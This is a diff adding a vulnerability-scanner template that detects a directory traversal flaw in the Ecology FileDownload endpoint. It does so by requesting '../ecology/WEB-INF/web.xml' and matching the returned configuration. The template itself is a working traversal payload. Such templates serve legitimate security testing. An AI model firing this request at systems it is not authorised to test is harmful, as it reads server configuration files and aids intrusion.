@@ -1,0 +1,21 @@
+id: ecology-filedownload-directory-traversal
+info:
+  name: Ecology Filedownload Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: directory-traversal
+  description: |
+    This template detects a directory traversal vulnerability in the Ecology Filedownload functionality by attempting to access the web.xml file.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<url-pattern>/weaver/"
